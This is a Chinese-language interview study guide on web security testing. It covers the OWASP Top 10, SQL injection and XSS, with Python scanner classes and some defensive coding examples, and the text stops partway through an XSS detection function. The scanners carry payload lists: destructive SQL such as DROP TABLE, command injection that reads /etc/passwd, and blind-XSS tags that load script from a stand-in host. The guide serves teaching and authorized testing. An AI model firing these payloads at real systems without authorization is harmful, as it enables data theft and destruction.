# Web应用安全测试专题

## 专题概述
本专题涵盖Web应用安全测试的核心内容，包括常见安全漏洞检测、安全测试工具使用、安全测试策略制定等，是高级测试开发工程师必须掌握的重要技能领域。

**核心技能点**：
- OWASP Top 10安全漏洞测试
- SQL注入和XSS攻击检测
- 身份认证和授权测试
- 安全测试工具使用
- API安全测试
- 数据加密和传输安全

---

## 题目列表

### ⭐⭐⭐ OWASP Top 10安全风险详解和测试方法
**难度**：⭐⭐⭐  
**频率**：🔥🔥🔥

**标准答案**：
**OWASP Top 10 (2021版)安全风险**：

1. **A01: 访问控制缺陷（Broken Access Control）**
2. **A02: 密码学缺陷（Cryptographic Failures）**
3. **A03: 注入攻击（Injection）**
4. **A04: 不安全设计（Insecure Design）**
5. **A05: 安全配置错误（Security Misconfiguration）**
6. **A06: 脆弱和过时的组件（Vulnerable and Outdated Components）**
7. **A07: 身份识别和身份验证缺陷（Identification and Authentication Failures）**
8. **A08: 软件和数据完整性缺陷（Software and Data Integrity Failures）**
9. **A09: 安全日志记录和监控缺陷（Security Logging and Monitoring Failures）**
10. **A10: 服务端请求伪造（Server-Side Request Forgery）**

**详细测试方法实现**：
```python
import requests
import re
import json
from urllib.parse import urljoin
import base64
import hashlib
import time

class OWASPSecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_a01_broken_access_control(self):
        """A01: 访问控制缺陷测试"""
        test_cases = [
            # 水平权限提升测试
            {
                'name': '水平权限提升',
                'method': 'GET',
                'endpoint': '/api/users/123/profile',
                'test_variations': [
                    '/api/users/124/profile',  # 尝试访问其他用户
                    '/api/users/1/profile',    # 尝试访问管理员
                    '/api/users/../admin/profile'  # 路径遍历
                ]
            },
            # 垂直权限提升测试
            {
                'name': '垂直权限提升',
                'method': 'GET',
                'endpoint': '/api/admin/dashboard',
                'headers': {'X-User-Role': 'admin'}  # 伪造角色头
            },
            # 直接对象引用测试
            {
                'name': '不安全直接对象引用',
                'method': 'GET',
                'endpoint': '/api/documents/1',
                'test_variations': [
                    '/api/documents/2',
                    '/api/documents/999999',
                    '/api/documents/-1'
                ]
            }
        ]
        
        results = []
        for test_case in test_cases:
            # 测试原始端点
            response = self.make_request(test_case['method'], test_case['endpoint'])
            
            if 'test_variations' in test_case:
                for variation in test_case['test_variations']:
                    var_response = self.make_request(test_case['method'], variation)
                    if var_response.status_code == 200:
                        results.append({
                            'vulnerability': 'A01-访问控制缺陷',
                            'endpoint': variation,
                            'risk_level': 'High',
                            'description': f"{test_case['name']} - 可能存在访问控制绕过"
                        })
        
        return results
    
    def test_a02_cryptographic_failures(self):
        """A02: 密码学缺陷测试"""
        vulnerabilities = []
        
        # 检测HTTP传输敏感数据
        sensitive_endpoints = ['/login', '/register', '/payment', '/api/auth']
        for endpoint in sensitive_endpoints:
            if not self.base_url.startswith('https://'):
                vulnerabilities.append({
                    'vulnerability': 'A02-密码学缺陷',
                    'endpoint': endpoint,
                    'risk_level': 'High',
                    'description': '敏感数据通过HTTP明文传输'
                })
        
        # 检测弱密码策略
        weak_passwords = ['123456', 'password', 'admin', 'test']
        for pwd in weak_passwords:
            response = self.make_request('POST', '/api/register', {
                'username': 'testuser',
                'password': pwd,
                'email': 'test@example.com'
            })
            if response.status_code == 201:
                vulnerabilities.append({
                    'vulnerability': 'A02-密码学缺陷',
                    'endpoint': '/api/register',
                    'risk_level': 'Medium',
                    'description': f'系统接受弱密码: {pwd}'
                })
        
        # 检测加密算法
        response = self.make_request('GET', '/api/config')
        if response.status_code == 200:
            config = response.text.lower()
            weak_crypto = ['md5', 'sha1', 'des', 'rc4']
            for crypto in weak_crypto:
                if crypto in config:
                    vulnerabilities.append({
                        'vulnerability': 'A02-密码学缺陷',
                        'endpoint': '/api/config',
                        'risk_level': 'Medium',
                        'description': f'使用弱加密算法: {crypto}'
                    })
        
        return vulnerabilities
    
    def test_a03_injection_attacks(self):
        """A03: 注入攻击测试"""
        injection_tests = []
        
        # SQL注入测试载荷
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, username, password FROM users --",
            "admin'--",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        # NoSQL注入载荷
        nosql_payloads = [
            {"$ne": None},
            {"$regex": ".*"},
            {"$where": "this.username == 'admin'"}
        ]
        
        # 测试SQL注入
        injection_endpoints = ['/search', '/login', '/api/users']
        for endpoint in injection_endpoints:
            for payload in sql_payloads:
                # GET参数注入
                response = self.make_request('GET', endpoint, params={'q': payload})
                if self.detect_sql_injection(response):
                    injection_tests.append({
                        'vulnerability': 'A03-SQL注入',
                        'endpoint': endpoint,
                        'payload': payload,
                        'risk_level': 'Critical',
                        'description': 'SQL注入漏洞'
                    })
                
                # POST数据注入
                response = self.make_request('POST', endpoint, {'username': payload})
                if self.detect_sql_injection(response):
                    injection_tests.append({
                        'vulnerability': 'A03-SQL注入',
                        'endpoint': endpoint,
                        'payload': payload,
                        'risk_level': 'Critical',
                        'description': 'POST数据SQL注入'
                    })
        
        # 命令注入测试
        command_payloads = [
            '; ls -la',
            '| whoami',
            '&& cat /etc/passwd',
            '`id`',
            '$(uname -a)'
        ]
        
        for endpoint in ['/api/system/ping', '/api/tools/convert']:
            for payload in command_payloads:
                response = self.make_request('POST', endpoint, {'input': payload})
                if self.detect_command_injection(response):
                    injection_tests.append({
                        'vulnerability': 'A03-命令注入',
                        'endpoint': endpoint,
                        'payload': payload,
                        'risk_level': 'Critical',
                        'description': '操作系统命令注入'
                    })
        
        return injection_tests
    
    def test_a04_insecure_design(self):
        """A04: 不安全设计测试"""
        design_issues = []
        
        # 检测业务逻辑漏洞
        test_scenarios = [
            # 价格篡改
            {
                'name': '价格篡改',
                'endpoint': '/api/orders',
                'payload': {
                    'product_id': 1,
                    'quantity': 1,
                    'price': 0.01  # 尝试修改价格
                }
            },
            # 批量操作限制
            {
                'name': '批量操作滥用',
                'endpoint': '/api/users/password-reset',
                'count': 100  # 批量重置密码
            },
            # 竞态条件
            {
                'name': '竞态条件',
                'endpoint': '/api/wallet/withdraw',
                'concurrent': True,
                'payload': {'amount': 100}
            }
        ]
        
        for scenario in test_scenarios:
            if scenario['name'] == '价格篡改':
                response = self.make_request('POST', scenario['endpoint'], 
                                           scenario['payload'])
                if response.status_code == 201:
                    order = response.json()
                    if order.get('total', 0) < 1:
                        design_issues.append({
                            'vulnerability': 'A04-不安全设计',
                            'endpoint': scenario['endpoint'],
                            'risk_level': 'High',
                            'description': '价格验证缺失，可能被篡改'
                        })
            
            elif scenario['name'] == '批量操作滥用':
                for i in range(scenario['count']):
                    response = self.make_request('POST', scenario['endpoint'],
                                               {'email': f'test{i}@example.com'})
                    if i > 10 and response.status_code == 200:
                        design_issues.append({
                            'vulnerability': 'A04-不安全设计', 
                            'endpoint': scenario['endpoint'],
                            'risk_level': 'Medium',
                            'description': '缺少批量操作限制'
                        })
                        break
        
        return design_issues
    
    def test_a05_security_misconfiguration(self):
        """A05: 安全配置错误测试"""
        config_issues = []
        
        # 检测默认配置
        default_paths = [
            '/admin',
            '/administrator',
            '/wp-admin',
            '/phpmyadmin',
            '/api/docs',
            '/swagger-ui',
            '/actuator',
            '/.env',
            '/config.json',
            '/web.config'
        ]
        
        for path in default_paths:
            response = self.make_request('GET', path)
            if response.status_code == 200:
                config_issues.append({
                    'vulnerability': 'A05-安全配置错误',
                    'endpoint': path,
                    'risk_level': 'Medium',
                    'description': f'可能暴露的管理界面或配置文件: {path}'
                })
        
        # 检测HTTP头安全配置
        response = self.make_request('GET', '/')
        security_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options', 
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        for header in security_headers:
            if header not in response.headers:
                config_issues.append({
                    'vulnerability': 'A05-安全配置错误',
                    'endpoint': '/',
                    'risk_level': 'Low',
                    'description': f'缺少安全HTTP头: {header}'
                })
        
        # 检测错误信息泄露
        error_endpoints = ['/api/nonexistent', '/admin/test', '/debug']
        for endpoint in error_endpoints:
            response = self.make_request('GET', endpoint)
            if response.status_code >= 500:
                if any(keyword in response.text.lower() for keyword in 
                       ['stack trace', 'exception', 'error', 'debug']):
                    config_issues.append({
                        'vulnerability': 'A05-安全配置错误',
                        'endpoint': endpoint,
                        'risk_level': 'Medium',
                        'description': '错误页面可能泄露敏感信息'
                    })
        
        return config_issues
    
    def detect_sql_injection(self, response):
        """检测SQL注入响应特征"""
        sql_error_patterns = [
            r'mysql_fetch_array',
            r'ORA-\d+',
            r'Microsoft.*ODBC.*SQL Server',
            r'PostgreSQL.*ERROR',
            r'warning.*mysql_',
            r'valid MySQL result',
            r'SQL syntax.*MySQL',
            r'Warning.*pg_'
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        # 检测基于时间的盲注
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def detect_command_injection(self, response):
        """检测命令注入响应特征"""
        command_indicators = [
            r'uid=\d+.*gid=\d+',  # Linux id命令
            r'root:.*:0:0:',       # /etc/passwd内容
            r'Directory of',       # Windows dir命令
            r'Volume.*Serial Number'  # Windows vol命令
        ]
        
        for pattern in command_indicators:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False
    
    def make_request(self, method, endpoint, data=None, params=None, headers=None):
        """统一的HTTP请求方法"""
        url = urljoin(self.base_url, endpoint)
        
        try:
            if method.upper() == 'GET':
                return self.session.get(url, params=params, headers=headers, timeout=10)
            elif method.upper() == 'POST':
                return self.session.post(url, json=data, headers=headers, timeout=10)
            elif method.upper() == 'PUT':
                return self.session.put(url, json=data, headers=headers, timeout=10)
            elif method.upper() == 'DELETE':
                return self.session.delete(url, headers=headers, timeout=10)
        except requests.exceptions.RequestException as e:
            # 返回模拟响应避免测试中断
            mock_response = requests.Response()
            mock_response.status_code = 500
            mock_response._content = str(e).encode()
            return mock_response
    
    def run_full_security_scan(self):
        """运行完整的安全测试扫描"""
        print("开始OWASP Top 10安全测试...")
        
        all_vulnerabilities = []
        
        # 执行各项安全测试
        all_vulnerabilities.extend(self.test_a01_broken_access_control())
        all_vulnerabilities.extend(self.test_a02_cryptographic_failures())
        all_vulnerabilities.extend(self.test_a03_injection_attacks())
        all_vulnerabilities.extend(self.test_a04_insecure_design())
        all_vulnerabilities.extend(self.test_a05_security_misconfiguration())
        
        return all_vulnerabilities

# 使用示例
security_tester = OWASPSecurityTester('https://api.example.com')
vulnerabilities = security_tester.run_full_security_scan()

# 生成安全测试报告
def generate_security_report(vulnerabilities):
    report = f"""
# 安全测试报告

## 测试概要
- 测试时间: {time.strftime('%Y-%m-%d %H:%M:%S')}
- 发现漏洞数量: {len(vulnerabilities)}
- 风险等级分布:
  - Critical: {len([v for v in vulnerabilities if v['risk_level'] == 'Critical'])}
  - High: {len([v for v in vulnerabilities if v['risk_level'] == 'High'])}
  - Medium: {len([v for v in vulnerabilities if v['risk_level'] == 'Medium'])}
  - Low: {len([v for v in vulnerabilities if v['risk_level'] == 'Low'])}

## 发现的安全问题

"""
    
    for i, vuln in enumerate(vulnerabilities, 1):
        report += f"""
### {i}. {vuln['vulnerability']} - {vuln['risk_level']}
- **端点**: {vuln['endpoint']}
- **描述**: {vuln['description']}
- **载荷**: {vuln.get('payload', 'N/A')}

"""
    
    return report

print(generate_security_report(vulnerabilities))
```

**OWASP测试checklist**：
```markdown
## OWASP Top 10 测试检查清单

### A01: 访问控制缺陷
- [ ] 水平权限提升测试
- [ ] 垂直权限提升测试  
- [ ] 直接对象引用测试
- [ ] 路径遍历测试
- [ ] 强制浏览测试

### A02: 密码学缺陷
- [ ] HTTPS/TLS配置检查
- [ ] 密码存储加密测试
- [ ] 敏感数据传输加密
- [ ] 弱加密算法检测
- [ ] 密钥管理测试

### A03: 注入攻击
- [ ] SQL注入测试
- [ ] NoSQL注入测试
- [ ] 命令注入测试
- [ ] LDAP注入测试
- [ ] XPath注入测试

### A04: 不安全设计
- [ ] 业务逻辑漏洞
- [ ] 工作流程缺陷
- [ ] 竞态条件测试
- [ ] 资源限制测试

### A05: 安全配置错误
- [ ] 默认配置检查
- [ ] 错误信息泄露
- [ ] HTTP安全头检查
- [ ] 文件权限检查
```

---

### ⭐⭐⭐ SQL注入攻击的检测和防范
**难度**：⭐⭐⭐  
**频率**：🔥🔥🔥

**标准答案**：
**SQL注入攻击分类**：

1. **基于错误的SQL注入**：利用数据库错误信息获取数据
2. **联合查询注入**：使用UNION语句获取其他表数据  
3. **布尔盲注**：根据页面返回判断查询结果真假
4. **时间盲注**：利用数据库延时函数判断注入成功
5. **堆叠查询注入**：执行多条SQL语句

**SQL注入检测方法**：
```python
import time
import re
import urllib.parse
from typing import List, Dict

class SQLInjectionTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.payloads = self.load_sql_payloads()
    
    def load_sql_payloads(self) -> Dict:
        """加载SQL注入测试载荷"""
        return {
            'error_based': [
                "'",
                "\"",
                "')",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; WAITFOR DELAY '0:0:5' --",
                "' UNION SELECT NULL--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--", 
                "' UNION SELECT version(),user(),database()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--"
            ],
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT SUBSTR(version(),1,1))='5'--",
                "' AND (SELECT LENGTH(database()))>5--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '0:0:5'--",  # SQL Server
                "' AND SLEEP(5)--",            # MySQL
                "' AND pg_sleep(5)--",         # PostgreSQL
                "'; SELECT pg_sleep(5)--",
                "' OR IF(1=1,SLEEP(5),0)--"
            ],
            'stacked_queries': [
                "'; DROP TABLE test--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--"
            ]
        }
    
    def test_error_based_injection(self, parameter: str) -> List[Dict]:
        """测试基于错误的SQL注入"""
        vulnerabilities = []
        
        for payload in self.payloads['error_based']:
            # URL编码载荷
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # 检查SQL错误特征
                if self.detect_sql_errors(response.text):
                    vulnerabilities.append({
                        'type': 'Error-based SQL Injection',
                        'parameter': parameter,
                        'payload': payload,
                        'evidence': self.extract_error_evidence(response.text),
                        'risk': 'High'
                    })
                
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")
        
        return vulnerabilities
    
    def test_union_based_injection(self, parameter: str) -> List[Dict]:
        """测试联合查询注入"""
        vulnerabilities = []
        
        # 首先确定列数
        column_count = self.detect_column_count(parameter)
        if column_count == 0:
            return vulnerabilities
        
        # 构造UNION载荷
        union_payloads = [
            f"' UNION SELECT {','.join(['NULL'] * column_count)}--",
            f"' UNION SELECT {','.join([str(i) for i in range(1, column_count + 1)])}--",
        ]
        
        for payload in union_payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # 检查是否成功执行UNION查询
                if self.detect_union_success(response.text, column_count):
                    vulnerabilities.append({
                        'type': 'Union-based SQL Injection',
                        'parameter': parameter,
                        'payload': payload,
                        'column_count': column_count,
                        'risk': 'Critical'
                    })
                
            except Exception as e:
                print(f"Error testing union payload: {e}")
        
        return vulnerabilities
    
    def test_boolean_blind_injection(self, parameter: str) -> List[Dict]:
        """测试布尔盲注"""
        vulnerabilities = []
        
        # 获取正常响应作为基准
        normal_response = self.session.get(f"{self.target_url}?{parameter}=1")
        normal_length = len(normal_response.text)
        normal_time = normal_response.elapsed.total_seconds()
        
        true_payloads = ["' AND 1=1--", "' AND 'a'='a'--"]
        false_payloads = ["' AND 1=2--", "' AND 'a'='b'--"]
        
        # 测试真条件
        true_responses = []
        for payload in true_payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            response = self.session.get(test_url, timeout=10)
            true_responses.append({
                'length': len(response.text),
                'status': response.status_code,
                'payload': payload
            })
        
        # 测试假条件
        false_responses = []
        for payload in false_payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            response = self.session.get(test_url, timeout=10)
            false_responses.append({
                'length': len(response.text),
                'status': response.status_code,
                'payload': payload
            })
        
        # 分析响应差异
        if self.analyze_boolean_responses(true_responses, false_responses):
            vulnerabilities.append({
                'type': 'Boolean-based Blind SQL Injection',
                'parameter': parameter,
                'true_payloads': true_payloads,
                'false_payloads': false_payloads,
                'risk': 'High'
            })
        
        return vulnerabilities
    
    def test_time_based_injection(self, parameter: str) -> List[Dict]:
        """测试时间盲注"""
        vulnerabilities = []
        
        # 获取正常响应时间
        start_time = time.time()
        normal_response = self.session.get(f"{self.target_url}?{parameter}=1")
        normal_time = time.time() - start_time
        
        for payload in self.payloads['time_based']:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            
            start_time = time.time()
            try:
                response = self.session.get(test_url, timeout=15)
                response_time = time.time() - start_time
                
                # 如果响应时间明显增长（超过5秒），可能存在时间注入
                if response_time > normal_time + 4:
                    vulnerabilities.append({
                        'type': 'Time-based Blind SQL Injection',
                        'parameter': parameter,
                        'payload': payload,
                        'normal_time': normal_time,
                        'injection_time': response_time,
                        'risk': 'High'
                    })
                
            except requests.exceptions.Timeout:
                vulnerabilities.append({
                    'type': 'Time-based Blind SQL Injection',
                    'parameter': parameter,
                    'payload': payload,
                    'evidence': 'Request timeout (likely successful delay)',
                    'risk': 'High'
                })
        
        return vulnerabilities
    
    def detect_sql_errors(self, response_text: str) -> bool:
        """检测SQL错误模式"""
        error_patterns = [
            # MySQL错误
            r"You have an error in your SQL syntax",
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_num_rows\(\)",
            r"Warning.*mysql_.*",
            
            # PostgreSQL错误
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            
            # SQL Server错误  
            r"Microsoft.*ODBC.*SQL Server",
            r"OLE DB.*SQL Server",
            r"(\[SQL Server\]|\[ODBC SQL Server Driver\]|\[SQLServer JDBC Driver\])",
            r"Exception.*System\.Data\.SqlClient\.SqlException",
            
            # Oracle错误
            r"\bORA-[0-9]+",
            r"Oracle error",
            r"Oracle.*Exception",
            r"Ora\..*Exception",
            
            # SQLite错误
            r"SQLite.*Exception",
            r"SQLite error",
            r"sqlite3.OperationalError"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def extract_error_evidence(self, response_text: str) -> str:
        """提取错误证据"""
        error_lines = []
        lines = response_text.split('\n')
        
        for line in lines:
            if any(keyword in line.lower() for keyword in 
                   ['error', 'warning', 'exception', 'ora-', 'mysql', 'postgresql']):
                error_lines.append(line.strip())
                if len(error_lines) >= 3:  # 限制证据长度
                    break
        
        return '\n'.join(error_lines)
    
    def detect_column_count(self, parameter: str) -> int:
        """检测查询列数"""
        for i in range(1, 21):  # 测试1-20列
            payload = f"' UNION SELECT {','.join(['NULL'] * i)}--"
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{parameter}={encoded_payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                # 如果没有错误且状态码正常，可能找到了正确的列数
                if (response.status_code == 200 and 
                    not self.detect_sql_errors(response.text)):
                    return i
                    
            except Exception:
                continue
        
        return 0
    
    def detect_union_success(self, response_text: str, column_count: int) -> bool:
        """检测UNION查询是否成功"""
        # 查找数字序列（如1,2,3,4）
        number_pattern = r'\b' + r'\b.*\b'.join([str(i) for i in range(1, column_count + 1)]) + r'\b'
        if re.search(number_pattern, response_text):
            return True
        
        # 查找重复的NULL值
        if response_text.count('NULL') >= column_count:
            return True
        
        return False
    
    def analyze_boolean_responses(self, true_responses: List, false_responses: List) -> bool:
        """分析布尔盲注响应差异"""
        if not true_responses or not false_responses:
            return False
        
        # 检查响应长度差异
        true_lengths = [r['length'] for r in true_responses]
        false_lengths = [r['length'] for r in false_responses]
        
        true_avg = sum(true_lengths) / len(true_lengths)
        false_avg = sum(false_lengths) / len(false_lengths)
        
        # 如果平均长度差异超过10%，可能存在布尔注入
        if abs(true_avg - false_avg) / max(true_avg, false_avg) > 0.1:
            return True
        
        # 检查状态码差异
        true_statuses = [r['status'] for r in true_responses]
        false_statuses = [r['status'] for r in false_responses]
        
        if set(true_statuses) != set(false_statuses):
            return True
        
        return False

# 使用示例
sql_tester = SQLInjectionTester('https://example.com/search')

# 测试所有类型的SQL注入
all_vulnerabilities = []
test_parameters = ['id', 'search', 'category', 'user_id']

for param in test_parameters:
    all_vulnerabilities.extend(sql_tester.test_error_based_injection(param))
    all_vulnerabilities.extend(sql_tester.test_union_based_injection(param))
    all_vulnerabilities.extend(sql_tester.test_boolean_blind_injection(param))
    all_vulnerabilities.extend(sql_tester.test_time_based_injection(param))

# 生成报告
if all_vulnerabilities:
    print("发现SQL注入漏洞:")
    for vuln in all_vulnerabilities:
        print(f"- {vuln['type']}: {vuln['parameter']} - {vuln['risk']}")
else:
    print("未发现SQL注入漏洞")
```

**SQL注入防范方法**：
```python
# 安全的数据库查询示例

# 1. 参数化查询（推荐）
def safe_user_query(user_id):
    """使用参数化查询防止SQL注入"""
    query = "SELECT * FROM users WHERE id = %s"
    cursor.execute(query, (user_id,))
    return cursor.fetchall()

# 2. 存储过程
def safe_user_login(username, password):
    """使用存储过程"""
    cursor.callproc('sp_user_login', [username, password])
    return cursor.fetchall()

# 3. ORM查询
def safe_orm_query(session, username):
    """使用ORM（SQLAlchemy示例）"""
    return session.query(User).filter(User.username == username).first()

# 4. 输入验证和清理
import re
def validate_and_sanitize_input(user_input):
    """输入验证和清理"""
    # 移除危险字符
    dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
    for char in dangerous_chars:
        user_input = user_input.replace(char, '')
    
    # 验证输入格式
    if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
        raise ValueError("Invalid input format")
    
    return user_input

# 5. 最小权限原则
def create_limited_db_user():
    """创建有限权限的数据库用户"""
    sql_commands = """
    CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
    GRANT SELECT, INSERT, UPDATE ON app_db.users TO 'app_user'@'localhost';
    GRANT SELECT ON app_db.products TO 'app_user'@'localhost';
    -- 不授予DROP, ALTER, DELETE等危险权限
    """
    return sql_commands
```

---

### ⭐⭐⭐ XSS跨站脚本攻击检测与防护
**难度**：⭐⭐⭐  
**频率**：🔥🔥🔥

**标准答案**：
**XSS攻击分类**：

1. **存储型XSS（Persistent XSS）**：恶意脚本存储在服务器上
2. **反射型XSS（Reflected XSS）**：恶意脚本通过URL参数反射执行
3. **DOM型XSS（DOM-based XSS）**：基于DOM操作的客户端XSS
4. **盲XSS（Blind XSS）**：在管理员界面等地方触发的XSS

**XSS检测工具实现**：
```python
import requests
import re
from urllib.parse import urljoin, quote
import html
import json
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.xss_payloads = self.load_xss_payloads()
        self.vulnerabilities = []
    
    def load_xss_payloads(self):
        """加载XSS测试载荷"""
        return {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<div onclick=alert("XSS")>Click</div>'
            ],
            'encoded': [
                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                '%3Cscript%3Ealert("XSS")%3C/script%3E',
                '&#60;script&#62;alert("XSS")&#60;/script&#62;',
                '\u003cscript\u003ealert("XSS")\u003c/script\u003e'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script/src=data:,alert("XSS")></script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                'javascript:alert("XSS")',
                '<img src="x" onerror="alert(&quot;XSS&quot;)">',
                '<svg><script>alert("XSS")</script></svg>',
                '<math><mi//xlink:href="data:x,<script>alert(\"XSS\")</script>">'
            ],
            'dom_based': [
                '#<script>alert("DOM XSS")</script>',
                'javascript:alert("DOM XSS")',
                '<img src=x onerror=eval(atob("YWxlcnQoIkRPTSBYU1MiKQ=="))>',  # base64编码
                '<svg onload="location.hash.slice(1)">#<script>alert("DOM XSS")</script>'
            ],
            'blind_xss': [
                '<script src="http://your-server.com/xss.js"></script>',
                '<img src="http://your-server.com/log.php?xss=stored">',
                '<iframe src="http://your-server.com/xss.html"></iframe>'
            ]
        }
    
    def test_reflected_xss(self, parameter_name, endpoint='/'):
        """测试反射型XSS"""
        reflected_vulns = []
        
        for category, payloads in self.xss_payloads.items():
            if category == 'blind_xss':  # 跳过需要外部服务器的盲XSS
                continue
                
            for payload in payloads:
                # URL参数测试
                test_url = f"{self.target_url}{endpoint}?{parameter_name}={quote(payload)}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    if self.detect_xss_in_response(response.text, payload):
                        reflected_vulns.append({
                            'type': 'Reflected XSS',
                            'endpoint': endpoint,
                            'parameter': parameter_name,
                            'payload': payload,
                            'method': 'GET',
                            'risk': 'High'
                        })
                
                except Exception as e:
                    print(f"Error testing reflected XSS: {e}")
                
                # POST数据测试
                try:
                    post_data = {parameter_name: payload}
                    response = self.session.post(f"{self.target_url}{endpoint}", 
                                               data=post_data, timeout=10)
                    
                    if self.detect_xss_in_response(response.text, payload):
                        reflected_vulns.append({
                            'type': 'Reflected XSS',
                            'endpoint': endpoint,
                            'parameter': parameter_name,
                            'payload': payload,
                            'method': 'POST',
                            'risk': 'High'
                        })
                
                except Exception as e:
                    print(f"Error testing POST reflected XSS: {e}")
        
        return reflected_vulns
    
    def test_stored_xss(self, form_endpoint, display_endpoint=None):
        """测试存储型XSS"""
        if not display_endpoint:
            display_endpoint = form_endpoint
        
        stored_vulns = []
        
        # 生成唯一标识符以追踪载荷
        import uuid
        unique_id = str(uuid.uuid4())[:8]
        
        for payload in self.xss_payloads['basic']:
            # 在载荷中加入唯一标识符
            tagged_payload = payload.replace('XSS', f'XSS-{unique_id}')
            
            # 提交载荷到表单
            form_data = {
                'comment': tagged_payload,
                'name': f'test_user_{unique_id}',
                'email': f'test_{unique_id}@example.com'
            }
            
            try:
                # 提交数据
                submit_response = self.session.post(
                    f"{self.target_url}{form_endpoint}", 
                    data=form_data, 
                    timeout=10
                )
                
                # 检查显示页面
                time.sleep(1)  # 等待数据处理
                display_response = self.session.get(
                    f"{self.target_url}{display_endpoint}", 
                    timeout=10
                )
                
                if self.detect_xss_in_response(display_response.text, tagged_payload):
                    stored_vulns.append({
                        'type': 'Stored XSS',
                        'form_endpoint': form_endpoint,
                        'display_endpoint': display_endpoint,
                        'payload': tagged_payload,
                        'unique_id': unique_id,
                        'risk': 'Critical'
                    })
            
            except Exception as e:
                print(f"Error testing stored XSS: {e}")
        
        return stored_vulns
    
    def test_dom_xss_with_browser(self):
        """使用浏览器测试DOM型XSS"""
        dom_vulns = []
        
        # 启动无头浏览器
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        try:
            driver = webdriver.Chrome(options=options)
            
            for payload in self.xss_payloads['dom_based']:
                test_url = f"{self.target_url}#{quote(payload)}"
                
                try:
                    driver.get(test_url)
                    time.sleep(2)  # 等待JavaScript执行
                    
                    # 检查是否触发了alert
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        
                        if 'DOM XSS' in alert_text:
                            dom_vulns.append({
                                'type': 'DOM-based XSS',
                                'url': test_url,
                                'payload': payload,
                                'evidence': f'Alert triggered: {alert_text}',
                                'risk': 'High'
                            })
                    
                    except:
                        # 没有alert，检查DOM变化
                        page_source = driver.page_source
                        if self.detect_dom_xss_indicators(page_source, payload):
                            dom_vulns.append({
                                'type': 'DOM-based XSS',
                                'url': test_url,
                                'payload': payload,
                                'evidence': 'DOM manipulation detected',
                                'risk': 'High'
                            })
                
                except Exception as e:
                    print(f"Error testing DOM XSS with payload {payload}: {e}")
            
        finally:
            try:
                driver.quit()
            except:
                pass
        
        return dom_vulns
    
    def detect_xss_in_response(self, response_text, payload):
        """检测响应中的XSS载荷"""
        # 直接匹配原始载荷
        if payload in response_text:
            return True
        
        # 检查HTML编码的载荷
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return False  # 已被正确编码，不是漏洞
        
        # 检查部分编码或过滤后的载荷
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<[^>]+on\w+\s*=',
            r'javascript:',
            r'<iframe[^>]*src\s*=',
            r'<img[^>]*onerror\s*=',
            r'<svg[^>]*onload\s*='
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                # 进一步检查是否与我们的载荷相关
                if any(keyword in response_text.lower() for keyword in 
                       ['alert', 'xss', 'script', 'onerror']):
                    return True
        
        return False
    
    def detect_dom_xss_indicators(self, page_source, payload):
        """检测DOM XSS指标"""
        indicators = [
            'XSS execution detected',
